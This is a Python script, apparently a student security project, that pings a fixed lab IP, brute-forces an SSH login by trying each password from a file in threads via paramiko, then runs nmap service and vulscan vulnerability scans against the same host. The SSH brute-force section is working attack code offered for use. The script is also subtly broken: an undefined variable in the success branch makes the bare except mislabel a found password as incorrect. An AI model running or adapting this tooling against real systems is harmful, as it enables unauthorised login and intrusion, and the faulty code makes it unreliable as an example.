#First implementation - Dragan Butkovic -P2408503

# IMPORTANT NOTE: Install Python PIP on Linux for a package management systems that simplifies installation 
# and mangement of software packages written in Python such as those found in the Python pacakage index (PyPI). 
# Pip is not installed by default on Ubuntu 18.04, but the installation is pretty straightforward.

# SHOULD INSTALL PIP and PIP PACKAGES 
# sudo apt install python3-pip
# sudo pip3 install termcolor
# sudo pip3 install paramiko

#1. fping
#2. SSH-Brute-Force
#3. NSE ports scan
#4. NSE ports vulnerability

import os
import paramiko
import sys
import socket
import threading, time
from termcolor import colored

#-------------------------------------------------FPing---------------------------------------------------------------#

#Perform the ping using the system ping the host (victims) (15 ping only) 
os.system('ping 192.168.253.136 -c 15')
print("pfing Done!")

#-------------------------------------------------SSH-Brute-Force-----------------------------------------------------#

#By SxNade
#importing the required libraries

exit_tag = 0
#setting the initial value to 0

print("\n\nstarting...")
os.system("notify-send Successfully initiated'")
time.sleep(2)

target_ip = "192.168.253.136"
username = "ubuntu"
password_file = "passwords.txt"
#Grabing the required variables....

#Defning A SSH connect Function to start SSH session Against Target...
def ssh_connect(password, code=0):
  global exit_tag
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#checking for each correct password in List 
  try:
    ssh.connect(target_ip, port=22, username=username, password=password)
    exit_tag = 1
    print(colored(f"\n[+]SSH Password For {username} found :> {password}    {hammer}\n", "red", attrs=['bold']))
    os.system(f"notify-send 'Password Found::{password}'")
  except:
    print(colored(f"[!]Incorrect SSH password:> {password}", 'red'))
  ssh.close()

  ssh.close()
  return code

#Checking that if the specified password File exists
if os.path.exists(password_file) == False:
  print(colored("[!] File Not Found", 'red'))
  sys.exit(1)

#Reading For Passwords From the Specified password File..!
with open(password_file, 'r') as file:
  for line in file.readlines():
    if exit_tag == 1:
      t.join()
      #Joining the Threads in-case we found a correct password..
      exit()
    password = line.strip()
    t = threading.Thread(target=ssh_connect, args=(password,))
    t.start()
    #starting threading on ssh_connect function which takes only one argument of password...
    time.sleep(0.3)
    #time in seconds between each successive thread//Don't change it unless very neccessary...!
    #Lowering this time value may cause some errors......!

print("Brute-Force-SHH_Completed")
#-------------------------------------------------NSE-port-scan----------------------------------------------------#

#Executing Nmap script to scan for Open ports from the host
os.system('nmap -sV 192.168.253.136')
print("NSE Done!")

#-------------------------------------------------NSE-vulnerability-scan-------------------------------------------#

#installing the vulscan script from git clone https://github.com/mrxdragan95/CTEC3451_2021_520_Development-Project.git
def vulscan():
    os.system('ln -s `pwd`/vulscan /usr/share/nmap/scripts/vulscan')
    print("Moving_to_Script-Vulscan.nse")

    
vulscan()
#Executing Nmap vulnerability scan using NSE scripts from the host  
os.system('nmap -sV --script=vulscan/vulscan.nse 192.168.253.136')

print("NSE vulnerability Done!")

print("Completed")

